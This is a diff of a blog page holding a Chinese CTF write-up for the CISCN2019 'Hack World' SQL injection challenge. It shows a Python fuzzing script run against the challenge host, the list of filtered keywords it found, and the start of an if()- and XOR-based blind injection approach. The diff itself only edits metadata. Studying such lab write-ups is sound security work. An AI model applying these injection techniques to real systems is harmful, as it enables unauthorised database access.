@@ -23,16 +23,16 @@
     var NexT = window.NexT || {};
     var CONFIG = {"hostname":"123-prog.github.io","root":"/","images":"/images","scheme":"Gemini","version":"8.2.0","exturl":false,"sidebar":{"position":"left","display":"always","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}};
   </script>
-<meta name="description" content="1.判断注入类型post注入，id&#x3D;1或id&#x3D;2时回显正常，id&#x3D;1’回显bool(false), id&#x3D;1&#x2F;1回显正常，则是数值型注入 2.fuzz一下看看过滤12345678910111213141516import requestsurl &#x3D; &quot;http:&#x2F;&#x2F;4bfe4b6f-e955-4745-98ab-4d80d69579e5.node3.buuoj.cn&#x2F;index.php&amp;">
+<meta name="description" content="1.判断注入类型post注入，id&#x3D;1或id&#x3D;2时回显正常，id&#x3D;1’回显bool(false), id&#x3D;1&#x2F;1回显正常，则是数值型注入">
 <meta property="og:type" content="article">
 <meta property="og:title" content="CISCN2019 华北赛区 Day2 Web1 Hack World">
 <meta property="og:url" content="https://123-prog.github.io/2021/01/16/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day2-Web1-Hack-World/index.html">
 <meta property="og:site_name" content="GY&#39;s Blog">
-<meta property="og:description" content="1.判断注入类型post注入，id&#x3D;1或id&#x3D;2时回显正常，id&#x3D;1’回显bool(false), id&#x3D;1&#x2F;1回显正常，则是数值型注入 2.fuzz一下看看过滤12345678910111213141516import requestsurl &#x3D; &quot;http:&#x2F;&#x2F;4bfe4b6f-e955-4745-98ab-4d80d69579e5.node3.buuoj.cn&#x2F;index.php&amp;">
+<meta property="og:description" content="1.判断注入类型post注入，id&#x3D;1或id&#x3D;2时回显正常，id&#x3D;1’回显bool(false), id&#x3D;1&#x2F;1回显正常，则是数值型注入">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://123-prog.github.io/2021/01/16/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day2-Web1-Hack-World/Snipaste_2021-01-16_23-44-12.png">
 <meta property="article:published_time" content="2021-01-16T15:36:45.000Z">
-<meta property="article:modified_time" content="2021-01-16T16:00:48.525Z">
+<meta property="article:modified_time" content="2021-01-16T16:02:31.886Z">
 <meta property="article:author" content="Guangyue">
 <meta property="article:tag" content="sql注入，盲注">
 <meta name="twitter:card" content="summary">
@@ -250,7 +250,7 @@
           <i class="far fa-calendar-check"></i>
         </span>
         <span class="post-meta-item-text">Edited on</span>
-        <time title="Modified: 2021-01-17 00:00:48" itemprop="dateModified" datetime="2021-01-17T00:00:48+08:00">2021-01-17</time>
+        <time title="Modified: 2021-01-17 00:02:31" itemprop="dateModified" datetime="2021-01-17T00:02:31+08:00">2021-01-17</time>
       </span>
 
   
@@ -264,6 +264,8 @@
     
     <div class="post-body" itemprop="articleBody">
         <h3 id="1-判断注入类型"><a href="#1-判断注入类型" class="headerlink" title="1.判断注入类型"></a>1.判断注入类型</h3><p>post注入，id=1或id=2时回显正常，id=1’回显bool(false), id=1/1回显正常，则是数值型注入</p>
+<a id="more"></a>
+
 <h3 id="2-fuzz一下看看过滤"><a href="#2-fuzz一下看看过滤" class="headerlink" title="2.fuzz一下看看过滤"></a>2.fuzz一下看看过滤</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://4bfe4b6f-e955-4745-98ab-4d80d69579e5.node3.buuoj.cn/index.php&quot;</span></span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;./sql.txt&quot;</span>)</span><br><span class="line"><span class="built_in">list</span> = []</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> f:</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;id&quot;</span>:<span class="string">&quot;1&quot;</span>+line</span><br><span class="line">    &#125;</span><br><span class="line">    r = requests.post(url, data=data)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;SQL Injection Checked.&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        print(line)</span><br><span class="line">        <span class="built_in">list</span>.append(line)</span><br><span class="line">print(<span class="built_in">list</span>)</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[&#39;AND&#39;, &#39;AUTHORIZATION&#39;, &#39;CORR&#39;, &#39;CORRESPONDING&#39;, &#39;CURRENT_DEFAULT_TRANSFORM_GROUP&#39;, &#39;CURRENT_TRANSFORM_GROUP_FOR_TYPE&#39;, &#39;CURSOR&#39;, &#39;DELETE&#39;, &#39;END-EXEC&#39;, &#39;FLOOR&#39;, &#39;FOR&#39;, &#39;FOREIGN&#39;, &#39;GROUP&#39;, &#39;GROUPING&#39;, &#39;GROUPS&#39;, &#39;IMPORT&#39;, &#39;INDICATOR&#39;, &#39;INSERT&#39;, &#39;INTO&#39;, &#39;LIMIT&#39;, &#39;NORMALIZE&#39;, &#39;OR&#39;, &#39;ORDER&#39;, &#39;PORTION&#39;, &#39;UNION&#39;, &#39;UPDATE&#39;, &#39;XMLFOREST&#39;]</span><br></pre></td></tr></table></figure>
 <h3 id="3-判断注入方式-盲注"><a href="#3-判断注入方式-盲注" class="headerlink" title="3.判断注入方式(盲注)"></a>3.判断注入方式(盲注)</h3><p>union被过滤，联合查询不行，绕过有点困难，报错注入也有点困难，盲注and ,or 等被过滤，if没被过滤，select也可以用，题目告知了我们表名和字段名，所以可以用if进行盲注，因为是数值型注入，所以if条件句直接作为参数传入，就不用and和or了，网上也看到有大佬用异或^来代替or进行盲注，如0^if(…….),下面以if为例子</p>
